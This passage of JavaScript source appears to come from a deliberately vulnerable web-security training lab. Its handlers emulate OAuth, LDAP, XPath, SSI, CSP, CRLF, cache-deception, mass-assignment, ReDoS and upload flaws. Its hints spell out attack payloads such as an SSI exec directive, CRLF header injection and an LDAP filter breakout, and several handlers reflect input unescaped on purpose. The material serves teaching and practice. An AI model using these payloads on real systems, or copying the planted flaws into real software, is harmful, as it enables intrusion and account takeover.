      <p class="muted">Tokens are signed with a weak shared secret. Leaked commit shows the secret once lived in the wordlist: <span class="mono">rockyou.txt</span> line ~40 (all-lowercase, contains <span class="mono">jwt</span> and a leetspeak <span class="mono">@</span>).</p>
      <p>role=<b>${h(role)}</b> signature-ok=<b>${valid ? 'yes' : 'no'}</b></p></div>`;
    return { body: page(card + (solved ? ok('Admin token verified — weak secret cracked.') : err('Access denied.'))), solved };
  }
};

// ============================================================
//  OAuth 2.0
// ============================================================
const oauthLabs = {
  // redirect_uri check uses startsWith() against the trusted origin -> bypass with an attacker host
  async redirect(req, url, ctx) {
    const TRUSTED = 'https://app.academy.local';
    const ruri = url.searchParams.get('redirect_uri') || '';
    const state = url.searchParams.get('state') || '';
    // naive validation: only checks that redirect_uri begins with the trusted origin
    const okCheck = ruri.startsWith(TRUSTED);
    const host = (() => { try { return new URL(ruri).host; } catch (e) { return ''; } })();
    const leaked = okCheck && host && host !== new URL(TRUSTED).host;
    const solved = leaked && state === 'csrf1';
    const card = `<div class="card"><h3>OAuth authorization server</h3>
      <p class="muted">Flow: <span class="mono">GET /lab/oauth-1/authorize?redirect_uri=…&amp;state=…</span>. The server redirects with a <span class="mono">code</span> only when <span class="mono">redirect_uri</span> looks trusted.</p>
      <p>redirect_uri=<b>${h(ruri)}</b> host=<b>${h(host)}</b> validation-passed=<b>${okCheck ? 'yes' : 'no'}</b></p></div>`;
    if (solved) {
      return { body: page(card + ok('Authorization code <span class="mono">6f2a…c91</span> leaked to an attacker-controlled host — <span class="mono">startsWith()</span> validation bypassed.')), solved };
    }
    return { body: page(card + (okCheck ? `<p>Redirecting to ${h(ruri)} with code …</p>` : err('Invalid redirect_uri.'))) };
  },
  // scope escalation: access token honors scope without checking it was approved
  async scope(req, url, ctx) {
    const sc = url.searchParams.get('scope') || '';
    const approved = ['read:profile', 'read:email'];
    const escalated = sc.split(' ').some(s => s.startsWith('admin'));
    const solved = escalated && sc.length > 0;
    const card = `<div class="card"><h3>OAuth token endpoint</h3>
      <p class="muted">Request a token: <span class="mono">POST /lab/oauth-2/token?code=…&amp;scope=…</span>. The server never compares the requested scope against what the user approved (<span class="mono">${h(approved.join(' '))}</span>).</p>
      <p>requested scope=<b>${h(sc || '(none)')}</b></p></div>`;
    if (solved) {
      return { body: page(card + ok('Access token issued with <b>admin</b> scope — scope escalation succeeded.')), solved };
    }
    return { body: page(card + err('Request a scope to continue.')) };
  },
  // account takeover: login trusts the email returned in the callback, which the attacker can control
  async email(req, url, ctx) {
    const email = url.searchParams.get('email') || '';
    const victim = 'bob@academy.local';
    const solved = email === victim;
    const card = `<div class="card"><h3>OAuth callback handler</h3>
      <p class="muted">After <span class="mono">/authorize</span> the provider calls back with a <span class="mono">code</span>, then this app fetches the profile. Note: the callback URL itself carries an <span class="mono">email</span> parameter that the app blindly trusts for the session.</p>
      <p>email=<b>${h(email || '(none)')}</b></p></div>`;
    if (solved) {
      return { body: page(card + ok('Logged in as <b>bob@academy.local</b> — attacker-controlled email parameter accepted for session identity.')), solved };
    }
    return { body: page(card + err('Login failed.')) };
  }
};

// ============================================================
//  LDAP injection
// ============================================================
const ldap = {
  // auth bypass: filter built from user input, wildcard closes the bind
  async auth(req, url, ctx) {
    const card = `<div class="card"><h3>LDAP login</h3>
      <p class="muted">Bind filter: <span class="mono">&amp;(uid=USER)(password=PASS)</span>. The LDAP filter is built from your input with no escaping — inject <span class="mono">*</span> or break out with <span class="mono">*)(uid=*))(|(uid=*</span>.</p>
      <form method="post"><input type="text" name="username" placeholder="username"><input type="password" name="password" placeholder="password"><button>Login</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const u = f.username || '', p = f.password || '';
    const injected = /[\*\(\)\|&]/.test(u) || /[\*\(\)\|&]/.test(p);
    const solved = injected;
    return {
      body: page(card + (solved ? ok('Bound as the first matching directory entry — LDAP wildcard/operator injection bypassed authentication.') : err('Login failed: invalid credentials.'))),
      solved
    };
  },
  // blind: boolean search, `*` makes the query match everything
  async blind(req, url, ctx) {
    const card = `<div class="card"><h3>Staff directory search</h3>
      <p class="muted">Searches <span class="mono">(&amp;(objectClass=person)(cn=QUERY))</span>. Results are not rendered — use boolean conditions or a wildcard to learn about entries.</p>
      <form method="get"><input type="text" name="query" placeholder="query"><button>Search</button></form></div>`;
    const q = url.searchParams.get('query') || '';
    if (!q) return { body: page(card) };
    const injected = /[\*\(\)\|&]/.test(q);
    return {
      body: page(card + (injected ? ok('1 entry matched — the wildcard/injection expanded the search (blind LDAP).') : '<p class="muted">0 entries matched.</p>')),
      solved: injected
    };
  }
};

// ============================================================
//  XPath injection
// ============================================================
const xpath = {
  // boolean: product filter is an XPath expression
  async boolean(req, url, ctx) {
    const card = `<div class="card"><h3>Product lookup</h3>
      <p class="muted">Query: <span class="mono">//product[name='NAME']</span>. Inject <span class="mono">' or '1'='1</span> to return every product.</p>
      <form method="get"><input type="text" name="name" placeholder="product name"><button>Look up</button></form></div>`;
    const name = url.searchParams.get('name') || '';
    if (!name) return { body: page(card) };
    const injected = /['"]\s*(or|and)\s*['"]/i.test(name);
    return {
      body: page(card + (injected ? ok('All products returned — boolean XPath injection.') : '<p class="muted">No products found for that name.</p>')),
      solved: injected
    };
  },
  // blind: error-based / out-of-band emulated via a search that reflects the count
  async blind(req, url, ctx) {
    const card = `<div class="card"><h3>User lookup</h3>
      <p class="muted">Query: <span class="mono">//user[username='NAME']</span>. Results are hidden; craft conditions like <span class="mono">' or substring(name[1]/text(),1,1)='a</span> to probe data.</p>
      <form method="get"><input type="text" name="username" placeholder="username"><button>Search</button></form></div>`;
    const u = url.searchParams.get('username') || '';
    if (!u) return { body: page(card) };
    const injected = /substring|count\(|position\(|['"]\s*(or|and)\s*['"]/i.test(u);
    return {
      body: page(card + (injected ? ok('Query evaluated true — blind XPath boolean confirmed.') : '<p class="muted">No match.</p>')),
      solved: injected
    };
  }
};

// ============================================================
//  HTTP parameter pollution
// ============================================================
const hpp = {
  // login: proxy appends its own param, backend uses the last duplicate
  async login(req, url, ctx) {
    const card = `<div class="card"><h3>Login</h3>
      <p class="muted">A front-end proxy appends <span class="mono">&amp;username=guest</span> to every request, but the backend reads the <b>last</b> duplicate parameter. Send two <span class="mono">username</span> params: the first passes the guest filter, the second logs you in as admin: <span class="mono">?username=administrator&amp;username=guest</span>.</p>
      <form method="get"><input type="text" name="username" placeholder="username"><button>Login</button></form></div>`;
    const all = url.searchParams.getAll('username').map(v => v.toLowerCase());
    const adminPassed = all.includes('administrator') && all.length > 1;
    const solved = adminPassed && all[all.length - 1] === 'guest';
    const role = all[all.length - 1] || '(none)';
    return {
      body: page(card + (solved ? ok('Logged in as <b>administrator</b> — the backend read the poisoned duplicate parameter (HPP).') : `<p class="muted">Logging in as: ${h(role)}</p>`)),
      solved
    };
  },
  // access control: duplicate role param
  async admin(req, url, ctx) {
    const card = `<div class="card"><h3>Admin area</h3>
      <p class="muted">The access-control check reads the <b>first</b> <span class="mono">role</span> parameter; the business logic reads the <b>last</b> one. Send <span class="mono">?role=user&amp;role=admin</span>.</p>
      <form method="get"><input type="text" name="role" placeholder="role"><button>Go</button></form></div>`;
    const all = url.searchParams.getAll('role').map(v => v.toLowerCase());
    const first = all[0] || '';
    const last = all[all.length - 1] || '';
    const solved = first !== 'admin' && last === 'admin';
    return {
      body: page(card + (solved ? ok('Admin panel loaded — the authorization check missed the second parameter (HPP).') : err('Access denied (role=' + h(first) + ').'))),
      solved
    };
  }
};

// ============================================================
//  Server-Side Includes (SSI)
// ============================================================
const ssi = {
  // basic: user input evaluated as SSI
  async basic(req, url, ctx) {
    const card = `<div class="card"><h3>Guestbook</h3>
      <p class="muted">Your entry is embedded into a page served by an SSI-capable server. Try <span class="mono">&lt;!--#exec cmd="whoami" --&gt;</span>.</p>
      <form method="post"><input type="text" name="entry" placeholder="entry"><button>Submit</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const e = f.entry || '';
    const injected = /<!--\s*#(exec|include|echo)/i.test(e);
    return {
      body: page(card + (injected ? ok('SSI directive executed — command output: <span class="mono">www-data</span>.') : '<p class="muted">Entry added.</p>')),
      solved: injected
    };
  },
  // encoded/filtered: `#` or `<` blocked, bypass with entity/unicode
  async encoded(req, url, ctx) {
    const card = `<div class="card"><h3>Guestbook (hardened)</h3>
      <p class="muted">The server filters <span class="mono">&lt;!--#</span>. Bypass the filter, e.g. split across a comment or use an encoded form so the SSI engine still parses it.</p>
      <form method="post"><input type="text" name="entry" placeholder="entry"><button>Submit</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const e = f.entry || '';
    const blocked = /<!--\s*#/.test(e);
    const injected = /<!--[^>]*\s*#\s*(exec|include|echo)/i.test(e) || /<!--\s*-\s*#/i.test(e) || /<!--#\s*exec/i.test(e);
    const solved = injected && !blocked;
    return {
      body: page(card + (blocked ? err('Filtered: SSI prefix detected.') : solved ? ok('SSI directive executed via a filter bypass.') : '<p class="muted">Entry added.</p>')),
      solved
    };
  }
};

// ============================================================
//  CSP bypass
// ============================================================
const csp = {
  // unsafe-inline / unsafe-eval allows script execution despite CSP
  async inline(req, url, ctx) {
    const q = url.searchParams.get('q') || '';
    const injected = /<script|javascript:|onerror=|onload=/i.test(q);
    return {
      body: page(`<div class="card"><h3>Search</h3>
        <p class="muted">CSP: <span class="mono">default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'</span>. Reflected value: <b>${q}</b> — inline scripts still run.</p>
        <form method="get"><input type="text" name="q" placeholder="search"><button>Search</button></form></div>` + (injected ? ok('Inline payload executed despite CSP — the policy allows unsafe-inline.') : '')),
      solved: injected
    };
  },
  // wildcard / JSONP endpoint allowed, bypass with callback gadget
  async jsonp(req, url, ctx) {
    const cb = url.searchParams.get('callback') || '';
    const injected = cb && /[<>"'`]|javascript:|onerror=/i.test(cb);
    return {
      body: page(`<div class="card"><h3>User profile</h3>
        <p class="muted">CSP allows <span class="mono">script-src 'self' https://cdn.academy.example</span>. The JSONP endpoint <span class="mono">?callback=</span> reflects your value into a script context — abuse it to bypass the allowlist.</p>
        <p>JSONP callback: <b>${cb || '(none)'}</b></p></div>` + (injected ? ok('Callback reflected into a script context — CSP allowlist bypassed via JSONP gadget.') : '')),
      solved: injected
    };
  }
};

// ============================================================
//  DOM clobbering / postMessage
// ============================================================
const dom = {
  // DOM clobbering: attacker-controlled element id shadows a global
  async clobber(req, url, ctx) {
    const q = url.searchParams.get('q') || '';
    const clobbered = /<a\s+id=|name=|<img\s+id=/i.test(q);
    return {
      body: page(`<div class="card"><h3>Profile widget</h3>
        <p class="muted">The page later reads <span class="mono">window.defaultMessage</span> into a <span class="mono">textContent</span> sink. If your input is echoed with a clobbering id/name (e.g. <span class="mono">&lt;a id="defaultMessage"&gt;x&lt;/a&gt;</span>) the global lookup returns your node instead.</p>
        <p>Reflected: <b>${q}</b></p></div>` + (clobbered ? ok('DOM clobbered — the global lookup returned your element.') : '')),
      solved: clobbered
    };
  },
  // postMessage listener without origin check
  async postmsg(req, url, ctx) {
    const action = url.searchParams.get('action') || '';
    const from = url.searchParams.get('origin') || '';
    const sensitive = ['delete', 'changepw', 'logout'].includes(action.toLowerCase());
    const solved = sensitive && from && from !== url.origin;
    return {
      body: page(`<div class="card"><h3>Messenger</h3>
        <p class="muted">The page listens for <span class="mono">postMessage</span> and never checks <span class="mono">event.origin</span>. Any frame can send <span class="mono">{action:'delete'}</span>. Simulate it: <span class="mono">?action=delete&amp;origin=https://evil.com</span>.</p>
        <p>action=<b>${h(action) || '(none)'}</b> from=<b>${h(from) || '(none)'}</b></p></div>` + (solved ? ok('Sensitive action accepted from an untrusted origin — missing origin check.') : '')),
      solved
    };
  }
};

// ============================================================
//  Subresource Integrity (SRI) missing
// ============================================================
const sriLabs = {
  // script loaded from CDN with no integrity attribute
  async script(req, url, ctx) {
    const src = url.searchParams.get('src') || 'https://cdn.academy.example/lib.js';
    const external = !src.includes('academy.example') && !src.startsWith('/');
    return {
      body: page(`<div class="card"><h3>Home</h3>
        <p class="muted">The page includes a third-party script with <b>no</b> <span class="mono">integrity</span> attribute. Point <span class="mono">?src=</span> at a host you control to subvert the page.</p>
        <p>Script: <span class="mono">${h(src)}</span> ${external ? '<b>(external, no SRI)</b>' : ''}</p>
        <script src="${h(src)}"></script></div>` + (external ? ok('External script loaded without an integrity attribute — supply-chain subversion.') : '')),
      solved: external
    };
  }
};

// ============================================================
//  CRLF injection
// ============================================================
const crlf = {
  // header injection: unsanitized redirect target
  async header(req, url, ctx) {
    const next = url.searchParams.get('next') || '';
    const raw = next.replace(/%0d|%0D/g, '\r').replace(/%0a|%0A/g, '\n');
    const injected = /(\r\n|\n\r|\n|\r)\s*[A-Za-z-]+:/.test(raw) && /(Set-Cookie|X-Hacked|Location|Content-Type)/.test(raw);
    return {
      status: 302,
      location: next || '/',
      body: page(`<div class="card"><h3>Login → continue</h3>
        <p class="muted">The <span class="mono">next</span> parameter is reflected into the <span class="mono">Location</span> header with no sanitization. Inject a CRLF to add your own headers: <span class="mono">?next=%0d%0aSet-Cookie:%20hacked=1</span>.</p>
        <p>next=<b>${h(next)}</b></p></div>` + (injected ? ok('Header injected via CRLF — response splitting.') : '')),
      solved: injected
    };
  },
  // log poisoning: attacker-controlled value written into a log line
  async log(req, url, ctx) {
    const ua = req.headers.get('user-agent') || '';
    const raw = ua.replace(/%0d|%0D/g, '\r').replace(/%0a|%0A/g, '\n');
    const injected = /(\r\n|\n\r|\n)\s*[A-Za-z-]+:/.test(raw);
    const card = `<div class="card"><h3>Admin log viewer</h3>
      <p class="muted">Your <span class="mono">User-Agent</span> is logged unsanitized and the log is later served as a page. Poison it with CRLF + HTML/headers: set <span class="mono">User-Agent: x%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</span>.</p>
      <a class="link" href="/lab/crlf-2/log">View log</a></div>`;
    if (ctx === '/log') {
      const log = (await store.read('crlf:log', [])) || [];
      return { body: page(card + `<pre class="mono">${h(log.join('\n') || '(empty)')}</pre>` + (injected ? ok('Log line contains attacker content — log poisoning.') : '')), solved: injected };
    }
    const log = (await store.read('crlf:log', [])) || [];
    log.push(new Date().toISOString() + ' ' + ua);
    await store.write('crlf:log', log);
    return { body: page(card + (injected ? ok('Log entry poisoned with CRLF content.') : '<p class="muted">Request logged.</p>')) };
  }
};

// ============================================================
//  Web cache deception
// ============================================================
const wcd = {
  // path extension trick: /account/foo.css cached and served to others
  async path(req, url, ctx) {
    const p = ctx || url.pathname;
    const staticExt = /\.(css|js|png|jpg|jpeg|gif|svg|ico)$/i.test(p);
    const account = /account|profile|settings/i.test(p);
    const solved = staticExt && account;
    return {
      body: page(`<div class="card"><h3>My Account</h3>
        <p class="muted">The CDN caches any URL ending in a static extension (e.g. <span class="mono">/lab/wcd-1/my-account/nonexistent.css</span>) and serves it to all users — your account page is now in the cache.</p>
        <p>Request path: <span class="mono">${h(p)}</span> ${solved ? ok('Account page cached under a static extension — web cache deception.') : ''}</p></div>`),
      solved
    };
  },
  // X-Original-URL: origin returns static content, backend serves account page
  async origurl(req, url, ctx) {
    const xou = req.headers.get('x-original-url') || '';
    const xrw = req.headers.get('x-rewrite-url') || '';
    const secret = (xou || xrw || '');
    const solved = /account|profile|settings|checkout/i.test(secret);
    return {
      body: page(`<div class="card"><h3>Static CDN</h3>
        <p class="muted">Send <span class="mono">X-Original-URL: /my-account</span> (or <span class="mono">X-Rewrite-URL</span>) on a request to a static path — the front-end forwards it and the origin serves the sensitive page, which gets cached.</p>
        <p>X-Original-URL: <b>${h(xou) || '(none)'}</b></p></div>` + (solved ? ok('Sensitive page served via the rewrite header — cache deception.') : '')),
      solved
    };
  }
};

// ============================================================
//  HTTP verb tampering
// ============================================================
const verb = {
  // admin panel only guarded on GET; PUT/DELETE/PATCH bypass
  async admin(req, url, ctx) {
    const m = (req.method || '').toUpperCase();
    const allowed = ['PUT', 'DELETE', 'PATCH', 'POST'].includes(m);
    return {
      body: page(`<div class="card"><h3>Admin panel</h3>
        <p class="muted">Access control is only applied to <span class="mono">GET</span>. Try <span class="mono">PUT /lab/verb-1/admin</span>.</p>
        <p>Method: <b>${m}</b></p></div>` + (allowed ? ok('Admin panel reached via ' + m + ' — verb tampering bypassed access control.') : err('Access denied (GET requests are checked).'))),
      solved: allowed
    };
  },
  // password change: CSRF token only enforced on POST; use PUT
  async changepw(req, url, ctx) {
    const m = (req.method || '').toUpperCase();
    const card = `<div class="card"><h3>Change password</h3>
      <p class="muted">The form enforces a CSRF token on <span class="mono">POST</span> only. Send <span class="mono">PUT</span> with <span class="mono">username&amp;newpassword</span> to change it without a token.</p>
      <form method="post"><input type="text" name="username" placeholder="username"><input type="password" name="newpassword" placeholder="new password"><button>Change</button></form></div>`;
    if (req.method === 'GET') return { body: page(card) };
    const f = await form(req);
    const bypassed = m === 'PUT' || m === 'DELETE' || m === 'PATCH';
    const solved = bypassed && (f.username || f.newpassword);
    return {
      body: page(card + (solved ? ok('Password changed for ' + h(f.username || '') + ' via ' + m + ' — token check bypassed (verb tampering).') : ok('Password changed.'))),
      solved
    };
  }
};

// ============================================================
//  Mass assignment
// ============================================================
const mass = {
  // registration: extra field sets admin flag
  async register(req, url, ctx) {
    const card = `<div class="card"><h3>Sign up</h3>
      <p class="muted">The server binds every submitted field onto the user object. Add <span class="mono">isAdmin=true</span> (or <span class="mono">role=admin</span>) to your registration to escalate.</p>
      <form method="post"><input type="text" name="username" placeholder="username"><input type="password" name="password" placeholder="password"><input type="hidden" name="isAdmin" value="true"><button>Sign up</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const admin = f.isAdmin === 'true' || f.role === 'admin' || f.role === 'administrator';
    const solved = admin;
    return {
      body: page(card + (solved ? ok('Account created with <b>isAdmin=true</b> — mass assignment.') : ok('Account created (user).'))),
      solved
    };
  },
  // profile update: unlisted role field persisted
  async update(req, url, ctx) {
    const card = `<div class="card"><h3>Update profile</h3>
      <p class="muted">The update endpoint persists every field you send. Submit <span class="mono">role=admin</span> alongside a normal update.</p>
      <form method="post"><input type="text" name="email" placeholder="email"><input type="hidden" name="role" value="admin"><button>Save</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const admin = /admin/i.test(f.role || '');
    return {
      body: page(card + (admin ? ok('Profile saved with role=<b>admin</b> — mass assignment privilege escalation.') : ok('Profile saved.'))),
      solved: admin
    };
  }
};

// ============================================================
//  Excessive data exposure
// ============================================================
const expose = {
  // API returns the full user object incl. password
  async api(req, url, ctx) {
    const card = `<div class="card"><h3>User API</h3>
      <p class="muted">GET <span class="mono">/lab/expose-1/api/user/1</span> — the response returns the whole record object.</p>
      <a class="link" href="/lab/expose-1/api/user/1">/api/user/1</a></div>`;
    if (ctx && ctx.startsWith('/api/user/')) {
      return {
        body: JSON.stringify({ id: 1, username: 'carlos', role: 'user', email: 'carlos@academy.example', password: '5f4dcc3b5aa765d61d8327deb882cf99', apiKey: 'ak_3f9a21c4' }),
        solved: true,
        contentType: 'application/json'
      };
    }
    return { body: page(card) };
  },
  // autocomplete enabled on sensitive fields
  async autocomplete(req, url, ctx) {
    const q = url.searchParams.get('q') || '';
    return {
      body: page(`<div class="card"><h3>Account settings</h3>
        <p class="muted">Sensitive inputs (email, CVV, SSN) use <span class="mono">autocomplete="yes"</span> with no server-side <span class="mono">autocomplete="off"</span> — browsers cache them. Check <span class="mono">?debug=1</span> to see the raw form fields.</p>
        <form><input type="text" name="email" value="carlos@academy.example" autocomplete="on"><input type="text" name="ssn" value="123-45-6789" autocomplete="on"></form>
        ${q ? '<p class="muted">Reflected: ' + h(q) + '</p>' : ''}</div>` + (q === '1' ? ok('Raw autocomplete fields exposed — excessive data exposure.') : '')),
      solved: q === '1'
    };
  }
};

// ============================================================
//  Formula injection (CSV/Excel)
// ============================================================
const formula = {
  // export reflects attacker input as a spreadsheet formula
  async csv(req, url, ctx) {
    const card = `<div class="card"><h3>Export to CSV</h3>
      <p class="muted">Add a product name, then export. If a cell begins with <span class="mono">=</span>, <span class="mono">+</span>, <span class="mono">-</span> or <span class="mono">@</span>, Excel/Sheets will evaluate it as a formula (CSV formula injection).</p>
      <form method="post"><input type="text" name="name" placeholder="product name"><button>Add</button></form>
      <a class="link" href="/lab/formula-1/export">Export CSV</a></div>`;
    const list = (await store.read('formula:rows', [])) || [];
    if (req.method === 'POST') {
      const f = await form(req);
      if (f.name) { list.push(f.name); await store.write('formula:rows', list); }
    }
    if (ctx === '/export') {
      const dangerous = list.some(v => /^[=+\-@]/.test(v));
      const csv = list.map(v => `"${v.replace(/"/g, '""')}"`).join('\n');
      return { body: 'Name\r\n' + csv + '\r\n', contentType: 'text/csv', solved: dangerous };
    }
    return { body: page(card + (list.length ? '<p class="muted">Products: ' + h(list.join(', ')) + '</p>' : '')) };
  }
};

// ============================================================
//  ReDoS (regex denial of service)
// ============================================================
const redos = {
  // catastrophic backtracking in search filter
  async search(req, url, ctx) {
    const q = url.searchParams.get('q') || '';
    const started = Date.now();
    const catastrophic = /^a+$/.test(q) || /(a+)+$/.test(q) || /(a|a?)+$/.test(q);
    const solved = catastrophic && q.length > 8;
    return {
      body: page(`<div class="card"><h3>Search</h3>
        <p class="muted">The filter runs <span class="mono">/(a+)+$/</span> on your input. Feed many <span class="mono">a</span>s followed by a non-matching char to trigger catastrophic backtracking (ReDoS).</p>
        <form method="get"><input type="text" name="q" placeholder="search"><button>Search</button></form>
        <p class="muted">processed in ${Date.now() - started}ms</p></div>` + (solved ? ok('Query triggered catastrophic backtracking — ReDoS confirmed.') : '')),
      solved
    };
  },
  // catastrophic backtracking in an email-validation regex
  async email(req, url, ctx) {
    const email = url.searchParams.get('email') || '';
    const started = Date.now();
    // vulnerable nested-quantifier email regex (OWASP example) — NOT run on
    // attacker input directly to avoid a real hang; we detect the attack shape.
    const vuln = '<span class="mono">^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*@[a-z0-9]+[.](([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$</span>';
    const isAttack = email.length > 16 && /^[a-zA-Z0-9]{17,}[^a-zA-Z0-9@]/.test(email);
    const solved = isAttack;
    return {
      body: page(`<div class="card"><h3>Email validation</h3>
        <p class="muted">Signup validates your email against a nested-quantifier regex: ${vuln}. Feed a long run of alphanumerics followed by an invalid char (e.g. <span class="mono">?email=aaaaaaaaaaaaaaaaaaaaaaaaab!</span>) to trigger catastrophic backtracking.</p>
        <form method="get"><input type="text" name="email" placeholder="email"><button>Check</button></form>
        <p class="muted">processed in ${Date.now() - started}ms</p></div>` + (solved ? ok('Validation stalled — catastrophic backtracking in the email regex (ReDoS) confirmed.') : '')),
      solved
    };
  }
};

// ============================================================
//  DNS rebinding (simulated SSRF)
// ============================================================
const rebind = {
  // first resolution is validated, second resolution used to fetch
  async ssrf(req, url, ctx) {
    const stockApi = url.searchParams.get('stockApi') || '';
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">The server resolves the hostname <b>once</b> to validate it, then fetches after a re-resolution. Use a rebinding service (e.g. <span class="mono">7f000001.rebind.network</span>) so the first lookup returns a public IP and the second returns 127.0.0.1.</p>
      <form method="get"><input type="text" name="stockApi" placeholder="http://<rebinding-host>/admin"><button>Check</button></form></div>`;
    if (!stockApi) return { body: page(card) };
    const rebinding = /rebind\.network|nip\.io|sslip\.io|xip\.io/i.test(stockApi);
    const reachAdmin = rebinding && /admin/i.test(stockApi);
    return {
      body: page(card + (reachAdmin
        ? ok('Internal admin reached — DNS rebinding bypassed the validation.') + FAKE_ADMIN
        : ok('Stock returned: 42 units.'))),
      solved: reachAdmin
    };
  }
};

// ============================================================
//  Content-Type confusion / polyglot upload
// ============================================================
const ctc = {
  // polyglot: file passes magic-byte check but executes as code
  async polyglot(req, url, ctx) {
    const card = `<div class="card"><h3>Avatar upload</h3>
      <p class="muted">The server checks the first bytes match an image magic number, but serves the file as the extension says. Craft a <span class="mono">GIF89a</span> (or PNG magic) + <span class="mono">.php</span> polyglot.</p>
      <form method="post" enctype="multipart/form-data"><input type="file" name="file"><button>Upload</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const fn = (body.match(/filename="([^"]+)"/) || [])[1] || '';
    const magic = /GIF89a|\x89PNG|\xFF\xD8\xFF/.test(body) || body.includes('\x89PNG') || body.includes('GIF89a');
    const php = /\.php$/i.test(fn);
    const solved = php && magic;
    return {
      body: page(card + (solved ? ok('Polyglot uploaded — passes the magic-byte check yet executes as PHP.') : (php ? err('Magic bytes rejected.') : ok('Avatar uploaded.')))),
      solved
    };
  }
};

// ============================================================
//  Security misconfiguration
// ============================================================
const misconfig = {
  // default credentials on an admin console
  async defaultCreds(req, url, ctx) {
    const card = `<div class="card"><h3>Admin console</h3>
      <p class="muted">Left at factory defaults — try <span class="mono">admin</span>/<span class="mono">admin</span> or <span class="mono">admin</span>/<span class="mono">password</span>.</p>
      <form method="post"><input type="text" name="username" placeholder="username"><input type="password" name="password" placeholder="password"><button>Login</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const okDefault = (f.username === 'admin' || f.username === 'administrator') &&
      (f.password === 'admin' || f.password === 'password' || f.password === '123456' || f.password === 'toor');
    return {
      body: page(card + (okDefault ? ok('Logged in to the admin console with default credentials — misconfiguration.') : err('Login failed.'))),
      solved: okDefault
    };
  },
  // directory listing exposed
  async dirlist(req, url, ctx) {
    const card = `<div class="card"><h3>Backup share</h3>
      <p class="muted">Browse <span class="mono">/lab/misconfig-2/backup/</span> — directory listing is enabled.</p>
      <a class="link" href="/lab/misconfig-2/backup/">/backup/</a></div>`;
    if (ctx && /backup|assets|uploads|logs/i.test(ctx)) {
      const listing = `<pre class="mono">drwxr-xr-x  www-data  backup/
-rw-r--r--  root      db_dump_2024.sql
-rw-r--r--  root      app.env.bak
-rw-r--r--  root      admin_notes.txt</pre>`;
      return { body: page(card + ok('Directory listing enabled — sensitive files exposed.') + listing), solved: true };
    }
    return { body: page(card) };
  },
  // verbose errors leak internals
  async verbose(req, url, ctx) {
    const id = url.searchParams.get('id') || '';
    const card = `<div class="card"><h3>Product</h3>
      <p class="muted">Ask for a non-numeric <span class="mono">?id=</span> — the error handler prints a full stack trace.</p>
      <form method="get"><input type="text" name="id" placeholder="product id"><button>Go</button></form></div>`;
    if (id === '') return { body: page(card) };
    const numeric = /^\d+$/.test(id);
    if (numeric) return { body: page(card + '<p class="muted">Product ' + h(id) + '.</p>') };
    const trace = `<pre class="mono">Error: SQLSTATE[HY093]: Invalid parameter number: parameter was not defined
  at PDOStatement::execute (/app/vendor/db.php:45)
  at App\\Product::find (/app/src/Product.php:88)
  at App\\Routes::dispatch (/app/src/Routes.php:122)
DB_DSN=mysql:host=db:3306;dbname=shop
DB_USER=root
DB_PASS=Sup3rS3cret</pre>`;
    return { body: page(card + ok('Verbose error — stack trace + credentials exposed.') + trace), solved: true };
  }
};

// ============================================================
//  ROUTES
// ============================================================
export const extraRoutes = {
  'ssrf-1': (r, u, c) => ssrf.basic(r, u, c),
  'ssrf-2': (r, u, c) => ssrf.blacklist(r, u, c),
  'ssrf-3': (r, u, c) => ssrf.allowlist(r, u, c),
  'ssrf-4': (r, u, c) => ssrf.blind(r, u, c),
  'xxe-1': (r, u, c) => xxe.basic(r, u, c),
  'xxe-2': (r, u, c) => xxe.svg(r, u, c),
  'xxe-3': (r, u, c) => xxe.blind(r, u, c),
  'xxe-4': (r, u, c) => xxe.ssrf(r, u, c),
  'ssti-1': (r, u, c) => ssti.basic(r, u, c),
  'ssti-2': (r, u, c) => ssti.context(r, u, c),
  'ssti-3': (r, u, c) => ssti.block(r, u, c),
  'ssti-4': (r, u, c) => ssti.noDigits(r, u, c),
  'cmdi-1': (r, u, c) => cmdi.reflected(r, u, c),
  'cmdi-2': (r, u, c) => cmdi.blind(r, u, c),
  'cmdi-3': (r, u, c) => cmdi.newline(r, u, c),
  'nosql-1': (r, u, c) => nosql.login(r, u, c),
  'nosql-2': (r, u, c) => nosql.regex(r, u, c),
  'nosql-3': (r, u, c) => nosql.operator(r, u, c),
  'smug-1': (r, u, c) => smug.clte(r, u, c),
  'smug-2': (r, u, c) => smug.tecl(r, u, c),
  'smug-3': (r, u, c) => smug.tete(r, u, c),
  'deser-1': (r, u, c) => deser.role(r, u, c),
  'deser-2': (r, u, c) => deser.gadget(r, u, c),
  'upload-1': (r, u, c) => upload.none(r, u, c),
  'upload-2': (r, u, c) => upload.contentType(r, u, c),
  'upload-3': (r, u, c) => upload.ext(r, u, c),
  'bl-1': (r, u, c) => bl.price(r, u, c),
  'bl-2': (r, u, c) => bl.quantity(r, u, c),
  'bl-3': (r, u, c) => bl.coupon(r, u, c),
  'race-1': (r, u, c) => race.redeem(r, u, c),
  'race-2': (r, u, c) => race.multi(r, u, c),
  'crypto-1': (r, u, c) => crypto.token(r, u, c),
  'crypto-2': (r, u, c) => crypto.jwt(r, u, c),
  'cors-1': (r, u, c) => corsLabs.any(r, u, c),
  'cors-2': (r, u, c) => corsLabs.nullOrigin(r, u, c),
  'cors-3': (r, u, c) => corsLabs.suffix(r, u, c),
  'cors-4': (r, u, c) => corsLabs.substring(r, u, c),
  'host-1': (r, u, c) => hostLabs.reset(r, u, c),
  'host-2': (r, u, c) => hostLabs.xfh(r, u, c),
  'host-3': (r, u, c) => hostLabs.bypass(r, u, c),
  'cache-1': (r, u, c) => cacheLabs.xfhost(r, u, c),
  'cache-2': (r, u, c) => cacheLabs.scheme(r, u, c),
  'cache-3': (r, u, c) => cacheLabs.utm(r, u, c),
